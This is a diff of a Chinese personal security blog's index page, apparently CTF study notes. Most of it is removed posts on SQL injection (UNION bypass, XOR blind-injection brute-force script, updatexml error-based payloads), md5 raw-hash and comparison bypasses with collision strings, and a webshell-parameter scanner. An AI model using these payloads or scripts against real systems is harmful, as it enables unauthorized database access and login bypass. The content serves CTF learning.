+<h3 id="Uses的使用【在某一过程里简化压栈和出栈】"><a href="#Uses的使用【在某一过程里简化压栈和出栈】" class="headerlink" title="Uses的使用【在某一过程里简化压栈和出栈】"></a>Uses的使用【在某一过程里简化压栈和出栈】</h3><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-7.png" alt="6-7"></p>
+<h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/7-1.png" alt="7-1"></p>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/">逆向工程核心原理</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-22</time><div class="content"><h1 id="小端序和大端序"><a href="#小端序和大端序" class="headerlink" title="小端序和大端序"></a>小端序和大端序</h1><p><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1-1.jpg" alt="1-1"></p>
 <p>大端序【更直观】：数据的低位存储在地址的高位。</p>
 <p>小端序【符合人类思维】：数据的低位存储在地址的低位。【Intel X86 CPU】</p>
@@ -905,129 +1154,7 @@
 
 
 <h2 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h2><p><a href="https://unicode-table.com/en/1D3A/" target="_blank" rel="noopener">这个网站找字符</a></p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/09/01/sql%E6%B3%A8%E5%85%A5/">sql注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-01</time><div class="content"><h2 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/2020/09/01/sql%E6%B3%A8%E5%85%A5/e1_1.png" alt="e1_1"></p>
-<p>使用UNION时，会出现一行虚拟的数据，这时候我们可以虚拟化一个原来的username【George】并且给他配上一个新的密码，这样操作的同时，我们就可以通过新的密码登录这个用户。</p>
-<h3 id="例题：-GXYCTF2019-BabySQli"><a href="#例题：-GXYCTF2019-BabySQli" class="headerlink" title="例题：[GXYCTF2019]BabySQli"></a>例题：[GXYCTF2019]BabySQli</h3><p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; union select 1,&#39;admin&#39;,&#39;4e42f7dd43ecbfe104de58610557c5ba&#39;#</span><br></pre></td></tr></table></figure>
-
-<p>因为username的输入无效，因此mysql返回的数据也只有我们虚拟化的那一行，即可成功登录。</p>
-<h3 id="题目环境复现"><a href="#题目环境复现" class="headerlink" title="题目环境复现"></a>题目环境复现</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'pw'</span>];</span><br><span class="line">$sql = <span class="string">"select * from user where username = '"</span>.$name.<span class="string">"'"</span>;   </span><br><span class="line"><span class="comment">// echo $sql;</span></span><br><span class="line">$result = mysqli_query($con, $sql);      </span><br><span class="line">$arr = mysqli_fetch_row($result);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="keyword">if</span>($arr[<span class="number">1</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(md5($password) == $arr[<span class="number">2</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"wrong pass!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"wrong user!"</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2020/09/01/sql%E6%B3%A8%E5%85%A5/e2_1.png" alt="e2_1"></p>
-<p>这个是利用了extractvalue()函数报错【updatexml】</p>
-<h2 id="ex3（异或注入）"><a href="#ex3（异或注入）" class="headerlink" title="ex3（异或注入）"></a>ex3（异或注入）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>本题过滤了union，按道理说可以使用</p>
-<blockquote>
-<p>利用<code>/*!union*/</code>可以绕过对union的过滤</p>
-</blockquote>
-<p>但是本题又过滤了*，所以可以使用以下异或注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select(column)from(table)			&#x2F;&#x2F;获取flag字段</span><br><span class="line">substr((select(column)from(table)),n,1)			&#x2F;&#x2F;获取flag字段的第n个字符</span><br><span class="line">ascii(substr((select(column)from(table)),n,1))&gt;N			&#x2F;&#x2F;判断其ascii码是否大于N</span><br><span class="line">0^(ascii(substr((select(column)from(table)),n,1))&gt;N)			&#x2F;&#x2F;如果判断式子为真，则相当于输入1，为假则相当于输入0</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="例题-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#例题-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="例题:[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>例题:[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>写出python脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://df9ba400-06d5-4de6-bdd2-ee86a9a7a73e.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = <span class="string">'0^(ascii(substr((select(flag)from(flag)),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(j) + <span class="string">')'</span></span><br><span class="line">		s = requests.post(url, data = &#123;<span class="string">'id'</span>:payload&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> s.text.find(<span class="string">'Error'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="ex1-极客大挑战-2019-HardSQL"><a href="#ex1-极客大挑战-2019-HardSQL" class="headerlink" title="ex1:[极客大挑战 2019]HardSQL"></a>ex1:[极客大挑战 2019]HardSQL</h3><p>过滤了空格，=，and，or</p>
-<p>于是有以下注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(database())),0x7e),1)%23&amp;password&#x3D;admin   &#x2F;&#x2F;爆库名</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1)%23&amp;password&#x3D;admin        &#x2F;&#x2F;爆表名</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columnss)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1)%23&amp;password&#x3D;admin        &#x2F;&#x2F;爆列名</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
-
-<p>接着发现只出现了左半部分的长度，于是想到用right()函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>extractvalue()</strong>原理一样，就是比updatexml()少一个参数，即两个没用的参数1去掉后面的那个。</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/10/md5%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/">md5有关漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-10</time><div class="content"><h2 id="有关md5的sql漏洞"><a href="#有关md5的sql漏洞" class="headerlink" title="有关md5的sql漏洞"></a>有关md5的sql漏洞</h2><blockquote>
-<p>Hint: select * from ‘admin’ where password=md5($pass,true)</p>
-</blockquote>
-<p>我们可知道，这句sql语句本来应该是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>我们就可以思考能不能找到一个字符串，经过md5加密之后会形成<code>&#39;or&#39;xxxxx</code>或者<code>xxxxx&#39;or&#39;</code>，其中xxxxx为真。因为这样之后就会构成sql的永真搜索：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;&#39;&#39; or &#39;xxxxx&#39;   &#x2F;&#x2F;xxxxx为真</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后发现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>
-
-<p>经过md5可以变成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or&#39;6�]��!r,��b</span><br></pre></td></tr></table></figure>
-
-<p>即可成功绕过</p>
-<blockquote>
-<p>这里留下一个问题，日后可以自己写脚本看看能不能跑出类似的字符串</p>
-</blockquote>
-<h2 id="md5弱类型比较"><a href="#md5弱类型比较" class="headerlink" title="md5弱类型比较"></a>md5弱类型比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>看了一下有两种方法：</p>
-<ol>
-<li><p>直接数组绕过，因为数组不能md5加密，所以返回假，两者就像等了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>可以找两个字符串，他们md5加密之后都类似于“0exxxxxx”，这样根据科学计数法，二者都等于0，所以相等。【我觉着1exxxxx应该也可以】</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;QNKCDZO&amp;b&#x3D;s214587387a</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-</li>
-</ol>
-<h2 id="md5强类型比较"><a href="#md5强类型比较" class="headerlink" title="md5强类型比较"></a>md5强类型比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">			<span class="keyword">echo</span> `$cmd`;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
-
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/10/python%E8%84%9A%E6%9C%AC%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">python脚本在ctf题目中的应用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-10</time><div class="content"><h2 id="对网页发起请求"><a href="#对网页发起请求" class="headerlink" title="对网页发起请求"></a>对网页发起请求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.get(payload)</span><br><span class="line">resText = res.text</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="列出文件列表"><a href="#列出文件列表" class="headerlink" title="列出文件列表"></a>列出文件列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">"D:/phpstudy_pro/WWW/src"</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="增加线程"><a href="#增加线程" class="headerlink" title="增加线程"></a>增加线程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, threadID, name, counter)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>               </span><br><span class="line">        Send(self.name, self.counter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">	thread = myThread(i,i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>)</span><br><span class="line">	thread.start()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-<h1 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h1><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/src/"</span></span><br><span class="line">files = os.listdir(<span class="string">"D:/phpstudy_pro/WWW/src"</span>)  <span class="comment">#列出所有文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getGetind</span><span class="params">(fileind)</span>:</span></span><br><span class="line">	a = [];</span><br><span class="line">	fp = open(<span class="string">"D:/phpstudy_pro/WWW/src/"</span> + fileind,<span class="string">'r'</span>)</span><br><span class="line">	lines = fp.readlines()   <span class="comment">#读取文件的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">		<span class="keyword">if</span> i.find(<span class="string">"$_GET['"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">			start = i.find(<span class="string">"$_GET['"</span>) + <span class="number">7</span></span><br><span class="line">			end = i.find(<span class="string">"'"</span>,start)</span><br><span class="line">			a.append(i[start:end])   <span class="comment">#找到需要的字段</span></span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> files:</span><br><span class="line">	getContent = getGetind(j)</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> getContent:</span><br><span class="line">		payload = url + j + <span class="string">"?"</span> + k + <span class="string">"=echo AlbatrossG"</span>   <span class="comment">#构造payload</span></span><br><span class="line">		print(payload)</span><br><span class="line">		html = requests.get(payload)    <span class="comment">#向网页发送请求</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"AlbatrossG"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">			print(<span class="string">"Success!"</span>)</span><br><span class="line">			exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span>   <span class="comment">#增加线程</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, threadID, name, counter)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>               </span><br><span class="line">        Send(self.name, self.counter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">	thread = myThread(i,i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>)</span><br><span class="line">	thread.start()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="例题-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#例题-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="例题:[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>例题:[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>写出python脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://df9ba400-06d5-4de6-bdd2-ee86a9a7a73e.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = <span class="string">'0^(ascii(substr((select(flag)from(flag)),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(j) + <span class="string">')'</span></span><br><span class="line">		s = requests.post(url, data = &#123;<span class="string">'id'</span>:payload&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> s.text.find(<span class="string">'Error'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-
-</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
 }</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
